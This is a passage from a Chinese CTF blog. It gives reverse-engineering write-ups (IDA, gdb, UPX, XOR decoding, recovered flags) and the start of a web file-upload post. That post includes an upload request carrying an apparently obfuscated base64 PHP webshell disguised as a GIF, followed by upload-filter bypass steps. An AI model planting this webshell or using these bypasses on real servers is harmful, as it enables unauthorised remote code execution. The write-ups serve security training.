class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">&quot;h4cky0u&quot;</span>, argv[<span class="number">3</span>])) &#123; <span class="comment">// h4cky0u</span></span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;so close, dude!\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Brr wrrr grr\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Get your key: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, hash);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行exe</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\1.exe  51966 25 h4cky0u</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c0ffee</span><br></pre></td></tr></table></figure>
<h1 id="simple-unpack"><a href="#simple-unpack" class="headerlink" title="simple-unpack"></a>simple-unpack</h1><p>考察：IDA，winhex</p>
<p>方法1：winhex</p>
<p>注意有不可识别字符，直接去掉即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Upx_1s_n0t_a_d3liv3r_c0mp4ny&#125;</span><br></pre></td></tr></table></figure>
<p>方法2：ida</p>
<p>同理</p>
<p>方法3：upx+ida</p>
<p>upx脱壳后，再用ida查看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;upx.exe -d 文件名</span><br></pre></td></tr></table></figure>


<h1 id="insanity"><a href="#insanity" class="headerlink" title="insanity"></a>insanity</h1><p>与simple-unpack同理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9447&#123;This_is_a_flag&#125;</span><br></pre></td></tr></table></figure>
<h1 id="python-trade"><a href="#python-trade" class="headerlink" title="python-trade"></a>python-trade</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># uncompyle6 version 3.7.4</span><br><span class="line"># Python bytecode 2.7 (62211)</span><br><span class="line"># Decompiled from: Python 2.7.18 (v2.7.18:8d21aa21f2, Apr 20 2020, 13:25:05) [MSC v.1500 64 bit (AMD64)]</span><br><span class="line"># Embedded file name: 1.py</span><br><span class="line"># Compiled at: 2017-06-03 10:20:43</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def encode(message):</span><br><span class="line">    s &#x3D; &#39;&#39;</span><br><span class="line">    for i in message:</span><br><span class="line">        x &#x3D; ord(i) ^ 32</span><br><span class="line">        x &#x3D; x + 16</span><br><span class="line">        s +&#x3D; chr(x)</span><br><span class="line"></span><br><span class="line">    return base64.b64encode(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">correct &#x3D; &#39;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#39;</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">print &#39;Input flag:&#39;</span><br><span class="line">flag &#x3D; raw_input()</span><br><span class="line">if encode(flag) &#x3D;&#x3D; correct:</span><br><span class="line">    print &#39;correct&#39;</span><br><span class="line">else:</span><br><span class="line">    print &#39;wrong&#39;</span><br><span class="line"># okay decompiling 2.pyc</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>反着写一个decode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def encode(message):</span><br><span class="line">    s &#x3D; &#39;&#39;</span><br><span class="line">    imessage &#x3D; base64.b64decode(message)</span><br><span class="line">    for i in imessage:</span><br><span class="line">        x &#x3D; ord(i) - 16</span><br><span class="line">        x &#x3D; x ^ 32</span><br><span class="line">        s +&#x3D; chr(x)</span><br><span class="line">	return s</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>此段只能用python2.7编译，用python3.9编译会出错（主要是for那段，猜测取消了这种for循环写法）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nctf&#123;d3c0mpil1n9_PyC&#125;</span><br></pre></td></tr></table></figure>


<h1 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h1><p>考察：IDA的使用</p>
<p>打开IDA，使用PE方式打开exe</p>
<p>单击main，按<strong>F5</strong>进入反编译</p>
<p>观察代码，提示要找到变量v5</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3 &#x3D; strcmp(v5.m128i_i8, v9);</span><br></pre></td></tr></table></figure>
<p>而v5从另外一个地方来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v5 &#x3D; _mm_loadu_si128((const __m128i *)&amp;xmmword_413E34);</span><br></pre></td></tr></table></figure>
<p><strong>双击xmmword_413E34</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rdata:00413E34 xmmword_413E34  xmmword 3074656D30633165577B465443545544h</span><br><span class="line">.rdata:00413E34                                         ; DATA XREF: _main+10↑r</span><br><span class="line">.rdata:00413E44 qword_413E44    dq 7D465443545544h      ; DATA XREF: _main+27↑r</span><br></pre></td></tr></table></figure>
<p>将3074656D30633165577B465443545544h和7D465443545544h 转换为字符串</p>
<p><strong>单击字符串，右键，</strong>选择有花括号那个选项（字符模式）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rdata:00413E34 xmmword_413E34  xmmword &#39;0tem0c1eW&#123;FTCTUD&#39;</span><br><span class="line">.rdata:00413E34                                         ; DATA XREF: _main+10↑r</span><br><span class="line">.rdata:00413E44 qword_413E44    dq &#39;&#125;FTCTUD&#39;            ; DATA XREF: _main+27↑r</span><br></pre></td></tr></table></figure>
<p>由于汇编存储为小端格式，将结果倒过来即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DUTCTF&#123;We1c0met0DUTCTF&#125;</span><br></pre></td></tr></table></figure>
<h1 id="game"><a href="#game" class="headerlink" title="game"></a>game</h1><p>打开exe，尝试输入1-8的数字，输入8时得到答案</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsctf&#123;T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t&#125;</span><br></pre></td></tr></table></figure>
<p>当然正确做法肯定不是瞎猜</p>
<p>关键代码段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">    if ( v5 )</span><br><span class="line">&#123;</span><br><span class="line">  sub_4576D6(v5 - 1);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  for ( i &#x3D; 0; i &lt; 8; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( (unsigned int)i &gt;&#x3D; 9 )</span><br><span class="line">      j____report_rangecheckfailure();</span><br><span class="line">    byte_532E28[i] &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">j__system(&quot;CLS&quot;);</span><br><span class="line">sub_458054();</span><br><span class="line">if ( byte_532E28[0] &#x3D;&#x3D; 1</span><br><span class="line">  &amp;&amp; byte_532E28[1] &#x3D;&#x3D; 1</span><br><span class="line">  &amp;&amp; byte_532E28[2] &#x3D;&#x3D; 1</span><br><span class="line">  &amp;&amp; byte_532E28[3] &#x3D;&#x3D; 1</span><br><span class="line">  &amp;&amp; byte_532E28[4] &#x3D;&#x3D; 1</span><br><span class="line">  &amp;&amp; byte_532E28[5] &#x3D;&#x3D; 1</span><br><span class="line">  &amp;&amp; byte_532E28[6] &#x3D;&#x3D; 1</span><br><span class="line">  &amp;&amp; byte_532E28[7] &#x3D;&#x3D; 1 )</span><br><span class="line">&#123;</span><br><span class="line">  sub_457AB4();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要么破解 sub_4576D6(v5 - 1)，使所有的byte数组为1</p>
<p>要么破解sub_457AB4()，使直接输出flag</p>
<h1 id="hello，ctf"><a href="#hello，ctf" class="headerlink" title="hello，ctf"></a>hello，ctf</h1><p>考察：ida的使用</p>
<p>反编译后，核心函数段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">strcpy(v13, &quot;437261636b4d654a757374466f7246756e&quot;);</span><br><span class="line">while ( 1 )</span><br><span class="line">&#123;</span><br><span class="line">  memset(v10, 0, sizeof(v10));</span><br><span class="line">  v11 &#x3D; 0;</span><br><span class="line">  v12 &#x3D; 0;</span><br><span class="line">  sub_40134B((int)aPleaseInputYou, v6);</span><br><span class="line">  scanf(&quot;%s&quot;, v9);</span><br><span class="line">  if ( strlen(v9) &gt; 0x11 )</span><br><span class="line">    break;</span><br><span class="line">  for ( i &#x3D; 0; i &lt; 17; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 &#x3D; v9[i];</span><br><span class="line">    if ( !v4 )</span><br><span class="line">      break;</span><br><span class="line">    sprintf(Buffer, &quot;%x&quot;, v4);</span><br><span class="line">    strcat(v10, Buffer);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( !strcmp(v10, v13) )</span><br><span class="line">    sub_40134B((int)aSuccess, v7);</span><br><span class="line">  else</span><br><span class="line">    sub_40134B((int)aWrong, v7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到v13字符串被437261636b4d654a757374466f7246756e赋值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">437261636b4d654a757374466f7246756e</span><br><span class="line">十六进制转换字符后得到</span><br><span class="line">CrackMeJustForFun</span><br></pre></td></tr></table></figure>
<p>可以看到v10和v13相等时，会传递aSuccess</p>
<p>此处就有一个经验之谈了，就是之后的函数sub_40134B很复杂，不需要继续解读，因此我们只需要提交v13的值即可</p>
<h1 id="logmein"><a href="#logmein" class="headerlink" title="logmein"></a>logmein</h1><p>考察：代码编写</p>
<p>在IDA中，关键代码段为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">v9 = <span class="number">0</span>;</span><br><span class="line"> <span class="built_in">strcpy</span>(v8, <span class="string">&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span>);</span><br><span class="line"> v7 = <span class="number">0x65626D61726168</span>LL;</span><br><span class="line"> v6 = <span class="number">7</span>;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the RC3 secure password guesser.\n&quot;</span>);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;To continue, you must enter the correct password.\n&quot;</span>);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;Enter your guess: &quot;</span>);</span><br><span class="line"> __isoc99_scanf(<span class="string">&quot;%32s&quot;</span>, s);</span><br><span class="line"> v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line"> <span class="keyword">if</span> ( v3 &lt; <span class="built_in">strlen</span>(v8) )</span><br><span class="line">   sub_4007C0();</span><br><span class="line"> <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); ++i )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">if</span> ( i &gt;= <span class="built_in">strlen</span>(v8) )</span><br><span class="line">     sub_4007C0();</span><br><span class="line">   <span class="keyword">if</span> ( s[i] != (<span class="keyword">char</span>)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]) ) <span class="comment">// BYTE指字节</span></span><br><span class="line">     sub_4007C0();</span><br><span class="line"> &#125;</span><br><span class="line"> sub_4007F0();</span><br></pre></td></tr></table></figure>
<p>可以得知，只要输入的s=v8，做一些运算后即可得到答案</p>
<p>c++版本</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt; // BYTE类型必须</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> v8[<span class="number">80</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(v8, <span class="string">&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span>);</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> v7 = <span class="number">28537194573619560LL</span>;</span><br><span class="line">	<span class="keyword">int</span> v6 = <span class="number">7</span>;</span><br><span class="line">	<span class="built_in">string</span> ans = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(v8); ++i )&#123;</span><br><span class="line">	    ans += (<span class="keyword">char</span>)(*((BYTE *)&amp;v7 + i % <span class="number">7</span>) ^ v8[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt;<span class="string">&quot;debug1 &quot;</span> &lt;&lt; ans;</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>python版本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># v7 = 28537194573619560LL</span></span><br><span class="line">v7_1 = <span class="string">&#x27;harambe&#x27;</span>  <span class="comment"># 需要转换为字符串（因为BYTE类型），并且由于小端序，需要翻转字符串</span></span><br><span class="line">v8 = <span class="string">&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span></span><br><span class="line">v6 = <span class="number">7</span></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v8)):</span><br><span class="line">	c = <span class="built_in">ord</span>(v7_1[i%<span class="number">7</span>]) ^ <span class="built_in">ord</span>(v8[i])</span><br><span class="line">	ans += <span class="built_in">chr</span>(c)</span><br><span class="line">	print(ans)</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RC3-2016-XORISGUD</span><br></pre></td></tr></table></figure>
<h1 id="no-strings-attached"><a href="#no-strings-attached" class="headerlink" title="no-strings-attached"></a>no-strings-attached</h1><p>考察：IDA使用，gbd使用，exeinfope使用</p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/zyh18851473527/article/details/105704672">https://blog.csdn.net/zyh18851473527/article/details/105704672</a></p>
<p>先使用exeinfo，判断其为linux下的文件</p>
<p>将文件拖入IDA</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setlocale(6, &amp;locale);</span><br><span class="line">  banner();</span><br><span class="line">  prompt_authentication();</span><br><span class="line">  authenticate();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>进入authenticate</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">void authenticate()</span><br><span class="line">&#123;</span><br><span class="line">  wchar_t ws[8192]; &#x2F;&#x2F; [esp+1Ch] [ebp-800Ch] BYREF</span><br><span class="line">  wchar_t *s2; &#x2F;&#x2F; [esp+801Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  s2 &#x3D; (wchar_t *)decrypt((wchar_t *)&amp;s, (wchar_t *)&amp;dword_8048A90);</span><br><span class="line">  if ( fgetws(ws, 0x2000, stdin) )</span><br><span class="line">  &#123;</span><br><span class="line">    ws[wcslen(ws) - 1] &#x3D; 0;</span><br><span class="line">    if ( !wcscmp(ws, s2) )</span><br><span class="line">      wprintf(&amp;unk_8048B44);</span><br><span class="line">    else</span><br><span class="line">      wprintf(&amp;unk_8048BA4);</span><br><span class="line">  &#125;</span><br><span class="line">  free(s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此处有两种思路</p>
<p>一种是跟进decrypt，分析运算逻辑，写脚本</p>
<p>一种是动态调试</p>
<p>查看汇编代码，找到decrypt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text:08048720                 call    decrypt</span><br><span class="line">.text:08048725                 mov     [ebp+s2], eax</span><br></pre></td></tr></table></figure>
<p>即eax存储着返回值</p>
<p>打开kali，进入gdb</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gbd</span><br></pre></td></tr></table></figure>
<p>打开文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file 1 &#x2F;&#x2F; 文件改名为1</span><br></pre></td></tr></table></figure>
<p>设置decrypt为断点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b decrypt</span><br></pre></td></tr></table></figure>
<p>执行到断点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r</span><br></pre></td></tr></table></figure>
<p>单步执行到decrypt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n</span><br></pre></td></tr></table></figure>
<p>显示寄存器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i r</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">eax            0x804e800           134539264</span><br><span class="line">ecx            0x1480              5248</span><br><span class="line">edx            0x7d                125</span><br><span class="line">ebx            0x0                 0</span><br><span class="line">esp            0xffff5300          0xffff5300</span><br><span class="line">ebp            0xffffd328          0xffffd328</span><br><span class="line">esi            0xf7fac000          -134561792</span><br><span class="line">edi            0xf7fac000          -134561792</span><br><span class="line">eip            0x8048725           0x8048725 &lt;authenticate+29&gt;</span><br><span class="line">eflags         0x282               [ SF IF ]</span><br><span class="line">cs             0x23                35</span><br><span class="line">ss             0x2b                43</span><br><span class="line">ds             0x2b                43</span><br><span class="line">es             0x2b                43</span><br><span class="line">fs             0x0                 0</span><br><span class="line">gs             0x63                99</span><br></pre></td></tr></table></figure>
<p>查看eax的值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x&#x2F;6sw $eax</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x804e800:    U&quot;9447&#123;you_are_an_international_mystery&#125;&quot;</span><br><span class="line">0x804e89c:    U&quot;W\001\xf7ade1e8\xf7ade1ea\xf7ade1ec\xf7ade1ee\xf7ade1f0\xf7ade1f2\xf7ade1f4\xf7ade1f6\xf7ade1f8\xf7ade1fa\001\xf7ade200\xf7ade204\xf7ade208\xf7ade20c\xf7ade210\xf7ade214\xf7ade218\xf7ade21c\xf7ade220\xf7ade224\xf7ade228\xf7ade22a\xf7ade22c\xf7ade22e\xf7ade230\xf7ade232\xf7ade234\xf7ade236\xf7ade238\xf7ade23a\060\061\062\063\064\065\066\067\070\071\x175a\xf7ade268\xf7ae3fd0\xf7aefaa0\xf7af5808\001\xf7b07f4c&quot;</span><br><span class="line">0x804e968:    U&quot;\xf7b07f54&quot;</span><br><span class="line">0x804e970:    U&quot;&quot;</span><br><span class="line">0x804e974:    U&quot;\xf7b07f7c\xf7b088b8\xf7b09234\xf7b0aa74\xf7b0acec\xf7b0af64\xf7b0b29c\xf7b0d194\xf7b0f08c\xf7b0f3c4\xf7b0f67c\xf7b10f74\xf7b127b4\xf7b138e4\xf7b14854\xf7b14b6c\xf7b1a988\xf7b1fba4\021\x435f687a\x54552e4e\x382d46\021\x435f687a\x54552e4e\x382d46!\x804ea00\001\x804ea80\001&quot;</span><br><span class="line">0x804e9f4:    U&quot;&quot;</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9447&#123;you_are_an_international_mystery&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/12/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Creverse%E5%88%9D%E7%BA%A7/" data-id="ckla3x5dq0001z0us7axj8uf4" data-title="CTF-wp-攻防世界reverse初级" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-Web-文件上传" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/08/CTF-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
  <time class="dt-published" datetime="2021-02-08T03:16:11.000Z" itemprop="datePublished">2021-02-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/02/08/CTF-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">CTF-Web-文件上传</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h1><p>来源：极客大挑战 2019</p>
<p>考察：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;sqzr.phtml&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">PD9waHAgDQokdWY9InNuYzMiOyAvL3Bhc3MgaXMgc3F6cg0KJGthPSJJRUJsZG1GYnNLIjsgDQokcGp0PSJDUmZVRTlUVkYiOyANCiR2YmwgPSBzdHJfcmVwbGFjZSgidGkiLCIiLCJ0aXN0aXR0aXJ0aV9ydGlldGlwbHRpYXRpY2UiKTsgDQokaXF3PSJGNmNpZGRLVHM9IjsgDQokYmtmID0gJHZibCgiayIsICIiLCAia2Jha3NrZTZrNGtfa2RrZWtja29rZGtlIik7IA0KJHNicCA9ICR2YmwoImN0dyIsIiIsImN0d2NjdHdyZWN0d2F0Y3R3ZWN0d19mY3R3dW5jY3R3dGN0d2lvY3R3biIpOyANCiRtcHkgPSAkc2JwKCcnLCAkYmtmKCR2YmwoImIiLCAiIiwgJGthLiRwanQuJHVmLiRpcXcpKSk7ICRtcHkoKTsgDQo&#x2F;PiA&#x3D;</span><br></pre></td></tr></table></figure>
<h1 id="uploadlabs"><a href="#uploadlabs" class="headerlink" title="uploadlabs"></a>uploadlabs</h1><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>考察：前端js检查绕过</p>
<p>在firefox中禁用js选项即可</p>
<h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>考察：content-type绕过</p>
<p>源码检查content-type，修改为image/jpeg，image/png，image/gif其中一个即可</p>
<h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p>考察：后缀绕过</p>
